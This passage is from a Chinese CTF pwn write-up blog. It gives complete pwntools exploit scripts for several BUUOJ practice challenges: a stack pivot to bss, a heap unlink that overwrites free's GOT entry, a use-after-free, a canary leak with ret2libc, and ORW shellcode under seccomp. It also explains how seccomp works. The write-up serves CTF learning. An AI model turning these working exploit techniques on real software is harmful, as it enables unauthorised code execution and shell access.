href="https://blog.csdn.net/huzai9527/article/details/114807930?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.base&spm=1001.2101.3001.4242">别人的详细的wp</a>  <a href="https://bbs.pediy.com/thread-223461.htm">看雪 不太详细</a> </p><h2 id="14-Black-Watch-入群题-PWN"><a href="#14-Black-Watch-入群题-PWN" class="headerlink" title="14.[Black Watch 入群题]PWN"></a>14.[Black Watch 入群题]PWN</h2><p>又是一种没见过的方法, 名为<strong>栈转移</strong>, 用于栈溢出不够, 以leave ret结尾, 有或能够向bss段写入数据的, 将<strong>rsp</strong>转移到<strong>bss</strong>段</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">leave = mov rsp, rbp pop rbp    <br>ret =  pop rip<br></code></pre></div></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs flow">st=&gt;parallel: 流程:<br>opa1=&gt;start: 填满栈上数组, <br>覆盖ebp为bss段某一地址<br>opa2=&gt;start: 修改返回地址为leave&amp;ret的gadget<br>opb1=&gt;start: 往bss写入4字节数据作为第二次 pop rbp<br>opb2=&gt;start: 如果未知sys,/bin/sh等地址<br>可用此次leak地址然后在下一次执行system函数<br>a=&gt;parallel: 结束<br>st(path1, left)-&gt;opa1-&gt;opa2<br>st(path2, right)-&gt;opb1-&gt;opb2<br>opa2-&gt;a<br>opb2-&gt;a<br><br></code></pre></div></td></tr></table></figure><p>…</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&#x27;./spwn&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25611</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;spwn&quot;</span>)<br><br>bss_s = <span class="hljs-number">0x0804A300</span><span class="hljs-comment">#将fake栈迁移到bss中</span><br>leave_ret = <span class="hljs-number">0x08048511</span><span class="hljs-comment">#栈迁移所需要的的地址</span><br>write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<span class="hljs-comment">#plt表可以调用write函数</span><br>write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<span class="hljs-comment">#got表里有write函数的真实地址</span><br>main_addr = elf.symbols[<span class="hljs-string">&quot;main&quot;</span>]<span class="hljs-comment">#控制函数执行流需要再次回到主函数</span><br><span class="hljs-comment"># 需要打印出write的真实地址查出，并且让函数再次返回主函数</span><br>payload = <span class="hljs-string">&quot;aaaa&quot;</span> + p32(write_plt) + p32(main_addr)<br>payload += p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>, payload)<br><span class="hljs-comment"># 上面将一些执行流程写入了bss段</span><br><span class="hljs-comment"># 接下来的写入的buf在栈上，所以可以控制程序执行到bss段</span><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x18</span> <span class="hljs-comment">#这个payload是写到栈上进行栈迁移的，所以先填充到ebp之前</span><br>payload += p32(bss_s) + p32(leave_ret)<br>p.sendafter(<span class="hljs-string">&quot;say?&quot;</span>, payload)<br><br>write_addr = u32(p.recv(<span class="hljs-number">4</span>)) <span class="hljs-comment">#接收泄露的地址</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;write&quot;</span>, write_addr) <span class="hljs-comment">#利用LibcSearcher函数可以根据泄露的地址找到相应的libc版本</span><br>libc_base = write_addr - libc.dump(<span class="hljs-string">&quot;write&quot;</span>)<span class="hljs-comment">#获取libc的基地址</span><br>system_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><span class="hljs-comment"># 第一次执行得到system函数地址后接下来会再次执行main函数</span><br><span class="hljs-comment"># 在这次有system函数的情况下再次进行相同的栈迁移执行system(&#x27;/bin/sh&#x27;)</span><br>payload = <span class="hljs-string">&quot;aaaa&quot;</span> + p32(system_addr) + p32(main_addr)<br>payload += p32(binsh_addr)<br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>, payload)<br><br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x18</span> + p32(bss_s) + p32(leave_ret)<br>p.sendafter(<span class="hljs-string">&quot;say?&quot;</span>, payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="15-easyheap"><a href="#15-easyheap" class="headerlink" title="15.easyheap"></a>15.easyheap</h2><p><strong>exp:</strong> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf=ELF(<span class="hljs-string">&quot;./easyheap&quot;</span>)<br>sh = remote(<span class="hljs-string">&quot;slkdfjsldkf&quot;</span>, <span class="hljs-number">932487</span>)<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system_plt=elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>context.binary = <span class="hljs-string">&#x27;./easyheap&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>ptr=<span class="hljs-number">0x6020e8</span><span class="hljs-comment"># heaparray[1]的指针的地址</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>    sh.recvuntil(<span class="hljs-string">b&quot;Your choice :&quot;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&quot;Size of Heap : &quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    sh.recvuntil(<span class="hljs-string">b&quot;Content of heap:&quot;</span>)<br>    sh.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, size, content</span>):</span><br>    sh.recvuntil(<span class="hljs-string">b&quot;Your choice :&quot;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br>    sh.recvuntil(<span class="hljs-string">b&quot;Size of Heap : &quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    sh.recvuntil(<span class="hljs-string">b&quot;Content of heap : &quot;</span>)<br>    sh.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>    sh.recvuntil(<span class="hljs-string">b&quot;Your choice :&quot;</span>)<br>    sh.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">b&quot;Index :&quot;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx).encode())<br><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;cccc&#x27;</span>)<br><span class="hljs-comment">#创建三个chunk</span><br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr-<span class="hljs-number">0x10</span>)<br>payload+=p64(<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#使用unlink修改heaparray</span><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(free_got)<br>payload+=p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br>delete(<span class="hljs-number">2</span>)<br>sh.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>sh.interactive()<br></code></pre></div></td></tr></table></figure><ul><li>最妙之处在于将free_got改为system_got, 然后又因为free和system都是指针类型, 只要伪造一个字符串指针就可以用free来执行system</li><li>主要步骤:<ul><li>在chunk1的user date里造一个fake chunk header, 注意到chunk2的PREV_SIZE被修改为20, inuse_bit为0, 以及设置”空”chunk的fd和bk指针, 以避开FD-&gt;bk == BK-&gt;fd == victim的检查</li><li>这样释放chunk2之后unlink就会使用<code>FD-&gt;bk = BK; BK-&gt;fd = FD;</code>后向合并, chunk1的user date变成另一个chunk, 并修改heaparray[1]为FD(ptr-0x18)</li><li>再次编辑chunk1, 由于heaparray[1]已经指向ptr-0x18, 所以填充两个64位0, 将[0]覆盖为free_got表的地址, [1]指向FD, [2]指向后8字节的”bin/sh”</li><li>编辑heaparray[0], 修改free_got的值为system_got</li><li>然后delete(2), 这时调用system_got, 参数是存储在该位置的指针, 值为binsh的地址, 成功执行</li></ul></li></ul><img src="https://i.loli.net/2021/08/19/VePjdSGNFOpEM6o.png" alt="654" style="zoom:50%;" /> <h2 id="16-hacknote"><a href="#16-hacknote" class="headerlink" title="16.hacknote"></a>16.hacknote</h2><p>比较简单的一道heap题, 主要是UAF</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./hacknote&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">29324</span>)<br><span class="hljs-keyword">else</span>:<br>    r = process(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  r.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>  r.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>  r.sendlineafter(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  r.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>  r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printf</span>(<span class="hljs-params">idx</span>):</span><br>  r.sendlineafter(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>  r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br>add(<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;bbbb&#x27;</span>)<br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br>mag = elf.sym[<span class="hljs-string">&quot;magic&quot;</span>]<br>add(<span class="hljs-number">12</span>, p32(mag)) <span class="hljs-comment">#2</span><br>printf(<span class="hljs-number">1</span>)<br>r.sendline(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>r.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="17-bjdctf-2020-babyrop2"><a href="#17-bjdctf-2020-babyrop2" class="headerlink" title="17.bjdctf_2020_babyrop2"></a>17.bjdctf_2020_babyrop2</h2><p>这题是leak canary + return2libc, 这个值好像不会变呐, 我再去查查</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./bjdctf_2020_babyrop2&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv one</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">29934</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./bjdctf_2020_babyrop2&quot;</span>)<br><span class="hljs-comment">#</span><br>elf = ELF(<span class="hljs-string">&quot;./bjdctf_2020_babyrop2&quot;</span>)<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>vuln = elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br>pop_rdi_ret = <span class="hljs-number">0x400993</span><br><br>sla(<span class="hljs-string">&#x27;u!\n&#x27;</span>, <span class="hljs-string">&#x27;%7$p&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(rn(<span class="hljs-number">18</span>), <span class="hljs-number">16</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>payload += flat([pop_rdi_ret, puts_got, puts_plt, vuln])<br>sla(<span class="hljs-string">&#x27;ry!\n&#x27;</span>, payload)<br><br>puts_addr = u64(rn(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span><br>payload += flat([pop_rdi_ret, binsh, sys])<br>sl(payload)<br>sl(<span class="hljs-string">&quot;cat flag&quot;</span>)<br>itt()<br></code></pre></div></td></tr></table></figure><h2 id="18-pwnable-orw"><a href="#18-pwnable-orw" class="headerlink" title="18.pwnable_orw"></a>18.pwnable_orw</h2><p>看上去像是很简单的shellcraft, 但是第一个函数就有点特别了:</p><p><img src="https://i.loli.net/2021/09/14/vONRPQkUxKWjALD.png" alt="image-20210914223414394"></p><ul><li>seccomp()函数查看</li><li>使用seccomp-tools:</li></ul><p><img src="https://i.loli.net/2021/09/14/oTh3rR9IzGwv6aC.png" alt="image-20210914223259160"></p><ul><li>看出仅可使用open, read, write这几个有用的函数</li><li>exp: (<a href="https://cloud.tencent.com/developer/article/1815026">这里是手写汇编调用syscall</a>)</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&#x27;node.buuoj.cn&#x27;</span>,<span class="hljs-number">25539</span>)<br><br>context.binary = <span class="hljs-string">&#x27;./orw&#x27;</span><br><br>shellcode = shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<span class="hljs-comment">#读取到栈中</span><br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">100</span>)<span class="hljs-comment">#打在标准输出上</span><br>shellcode = asm(shellcode)<br><br>sleep(<span class="hljs-number">0.2</span>)<span class="hljs-comment">#意义不明</span><br>io.sendline(shellcode)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p><strong>新机制: seccomp</strong> </p><blockquote><p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p></blockquote><p><img src="https://i.loli.net/2021/09/13/ekGP6w4rBUmzyFn.png" alt="image-20210913162407923"></p><p>可以看到调用了一个新的函数<code>prctl()</code>. 具体的<a href="https://www.man7.org/linux/man-pages/man2/prctl.2.html">LInux Man Page</a>和<a href="https://code.woboq.org/userspace/include/linux/prctl.h.html">option使用的宏定义</a>在此</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">prctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> option, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg2, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg3,</span></span><br><span class="hljs-params"><span class="hljs-function">                 <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg4, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> arg5)</span></span>;<br></code></pre></div></td></tr></table></figure><p>对于第一个<code>prctl()</code>, 38就是<code>PR_SET_NO_NEW_PRIVS</code>, 因此可以查到作用是: </p><blockquote><p>set the calling thread’s no_new_privs attribute to thevalue in <em>arg2</em>. With no_new_privs set to 1, execve(2)<br>promises not to grant privileges to do anything that couldnot have been done without the execve(2) call (for<br>example,rendering the set-user-ID and set-group-ID modebits,and file capabilities non-functional). Once set,the no_new_privs attribute cannot be unset. </p></blockquote><p>简单来说就是禁用<code>execve()</code>函数以及使用到<code>execve()</code>的其他函数</p><p>对于第二个<code>prctl()</code>, 22就是<code>PR_SET_SECCOMP</code>, 查到的作用是:</p><blockquote><p>Set the secure computing (seccomp) mode for the calling thread, to limit the available system calls.</p><p>With arg2 set to <strong>SECCOMP_MODE_STRICT</strong>(equals 1),the only systemcalls that the thread is permitted to make are <code>read</code>(2)，<code>write</code>(2)，<code>_exit</code>(2)(but not exit_group(2)), and <code>sigreturn</code>(2). Other system calls result in the deliveryof a <code>SIGKILL</code> signal. </p><p>With arg2 set to <strong>SECCOMP_MODE_FILTER</strong>(equals 2)(since Linux 3.5)，the system calls allowed are defined by a pointer to aBerkeley Packet Filter passed in arg3. <em>This argument is apointer to struct sock_fprog</em>; it can be designed to filterarbitrary system calls and system call arguments. </p></blockquote><p>如果选了SECCOMP_MODE_FILTER:</p><p>我们先解释一些原理, 一些示例网站在此 (<a href="https://blog.csdn.net/u013250169/article/details/115669655">seccomp1</a>) (<a href="https://www.jianshu.com/p/75e157cea215">seccomp2</a>) (<a href="https://linux.cn/article-9507-1.html">BPF介绍</a>) (<a href="https://www.cnblogs.com/honpey/p/8013073.html">BPF指令集</a>):</p><ul><li>两个关键struct:</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Filter block */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> &#123;</span> <br>   __u16 code; <span class="hljs-comment">/* Actual filter code */</span> <br>   __u8 jt; <span class="hljs-comment">/* Jump true */</span><br>   __u8 jf; <span class="hljs-comment">/* Jump false */</span><br>   __u32 k; <span class="hljs-comment">/* Generic multiuse field */</span> <br>  <br>&#125;; <br><span class="hljs-comment">/* Required for SO_ATTACH_FILTER. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> &#123;</span> <br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> len; <span class="hljs-comment">/* Number of filter blocks */</span> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> *<span class="hljs-title">filter</span>;</span> <br>&#125;;<br></code></pre></div></td></tr></table></figure><ol><li>code变量涉及到了BPF这种技术, 而seccomp技术就是借鉴BPF的源码, 所以可以到BPF的指令集中找到这个变量的组合方式, 用一些神奇的手段把一些instructions编码进u16中. </li><li>jt和jf的意思较为明显, 就是jump if true||false</li><li>k装啥都行</li></ol><ul><li>作用原理:</li></ul><blockquote><p>每个系统调用都会陷入系统调用控制函数syscall_trace_enter中，该函数中调用了secure_computing，系统调用号作为参数传递。在__secure_computing函数中，通过current-&gt;seccomp.mode提取标志位mode，如果mode为1或者2，则说明当前进程已经设置了seccomp限制。如果是1(<strong>SECCOMP_MODE_STRICT</strong>)则就只允许四个系统调用, 如果是2(<strong>SECCOMP_MODE_FILTER</strong>)就如上面所示</p></blockquote><ul><li>效果: 就是自己设定每一条系统调用所对应的处理方法, 查询方式可以使用下面的工具, 自己设置可以小部分参考→<a href="https://blog.csdn.net/u013250169/article/details/115669655">这里</a>.</li></ul><p><strong>seccomp-tools</strong>用法:(<a href="https://github.com/david942j/seccomp-tools">Github Page</a>)</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo gem install seccomp-tools<br>nevv@ubuntu:~/Desktop/seccomp-tools-master/bin$ seccomp-tools dump ../../pwn1<br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000004  A = 